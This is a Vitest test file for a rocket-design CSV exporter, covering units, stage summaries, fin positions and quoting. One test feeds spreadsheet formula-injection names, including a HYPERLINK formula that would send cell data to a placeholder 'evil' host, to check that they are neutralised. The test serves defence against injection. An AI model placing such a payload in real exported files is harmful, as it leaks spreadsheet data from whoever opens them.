import { describe, it, expect } from 'vitest';
import type { StaticInfo } from '../../src/engine/openRocketEngine';
import type { ReportModel } from '../../src/services/reportModel';
import { buildDesignCsv } from '../../src/services/reportCsv';
import { METRIC_UNITS, IMPERIAL_UNITS } from '../../src/prefs/units';

const info = {
  length: 0.9,
  refDiameter: 0.079,
  mass: 4.25,
  massEmpty: 3.43,
  cg: 1.382,
  cgEmpty: 1.244,
  cp: 1.629,
  cna: 26.42,
  stabilityCalibers: 3.14,
  rollInertia: 0.0054,
  pitchInertia: 1.83,
  cd: 1.115,
} as unknown as StaticInfo;

const model: ReportModel = {
  name: 'Fireball',
  stages: [{ type: 'stage' }, { type: 'stage' }] as never,
  whole: { label: 'Fireball', info },
  stageSummaries: [
    { label: 'Sustainer', info },
    { label: 'Booster', info },
  ],
  configs: [],
  partsByStage: [],
  finSetsByStage: [{ stage: 'Sustainer', sets: [{ name: 'Fin set', topX: 1.118, bottomX: 1.271 }] }],
};

describe('design CSV', () => {
  const csv = buildDesignCsv(model, METRIC_UNITS);
  const rows = csv
    .trimEnd()
    .split('\r\n')
    .map((l) => l.split(','));

  it('starts with the Scope/Field/Value/Unit header', () => {
    expect(rows[0]).toEqual(['Scope', 'Field', 'Value', 'Unit']);
  });

  it('has the Design block', () => {
    expect(rows).toContainEqual(['Design', 'Name', 'Fireball', '']);
    expect(rows).toContainEqual(['Design', 'Design Type', 'Original Design/Other', '']);
    expect(rows).toContainEqual(['Design', 'Stages', '2', '']);
  });

  it('has the Rocket summary in the chosen units with dot decimals', () => {
    expect(rows).toContainEqual(['Rocket', 'Length', '90', 'cm']);
    expect(rows).toContainEqual(['Rocket', 'Stability (on pad)', '3.14', 'cal']);
    expect(rows).toContainEqual(['Rocket', 'CP', '162.9', 'cm']);
    expect(rows).toContainEqual(['Rocket', 'Normal-Force Slope (CNα)', '26.42', '/rad']);
  });

  it('converts values and names the unit when the preference is imperial', () => {
    const imp = buildDesignCsv(model, IMPERIAL_UNITS)
      .trimEnd()
      .split('\r\n')
      .map((l) => l.split(','));
    // 0.9 m = 35.433 in; 4.25 kg = 149.914 oz.
    expect(imp).toContainEqual(['Rocket', 'Length', '35.433', 'in']);
    expect(imp).toContainEqual(['Rocket', 'Mass (Loaded)', '149.914', 'oz']);
  });

  it('emits a summary block per stage', () => {
    expect(rows).toContainEqual(['Sustainer', 'Length', '90', 'cm']);
    expect(rows).toContainEqual(['Booster', 'Length', '90', 'cm']);
  });

  it('emits fin-set root positions per stage', () => {
    expect(rows).toContainEqual(['Sustainer', 'Fin set: Nose to top of fin root', '111.8', 'cm']);
    expect(rows).toContainEqual(['Sustainer', 'Fin set: Nose to bottom of fin root', '127.1', 'cm']);
  });

  it('quotes a value containing a comma', () => {
    const c = buildDesignCsv({ ...model, name: 'Big, Rocket' }, METRIC_UNITS);
    expect(c).toContain('Design,Name,"Big, Rocket",');
  });

  // `model.name` is the <name> of an imported .ork, so it is untrusted: share
  // someone a design and its name lands in a cell of the CSV they export.
  // Excel and Sheets execute a cell that leads with = + - @.
  it.each(['=HYPERLINK("http://evil/?"&A1,"Open")', '+1+1', '-1+1', '@SUM(A1)'])(
    'neutralizes a formula-triggering design name: %s',
    (name) => {
      const c = buildDesignCsv({ ...model, name }, METRIC_UNITS);
      const value = c
        .split('\r\n')
        .find((l) => l.startsWith('Design,Name,'))!
        .slice('Design,Name,'.length);
      // Leads with an apostrophe, so the spreadsheet takes the cell as text.
      // Quoting is separate and only kicks in for delimiters, so accept either
      // `'=…` or `"'=…"`.
      expect(value.replace(/^"/, '').startsWith("'")).toBe(true);
    },
  );

  it('quotes a bare CR, which would otherwise split the record', () => {
    // The file's own terminator is \r\n, so an unquoted lone \r reads as a row
    // break to an RFC-4180 parser.
    const c = buildDesignCsv({ ...model, name: 'One\rTwo' }, METRIC_UNITS);
    expect(c).toContain('"One\rTwo"');
  });
});
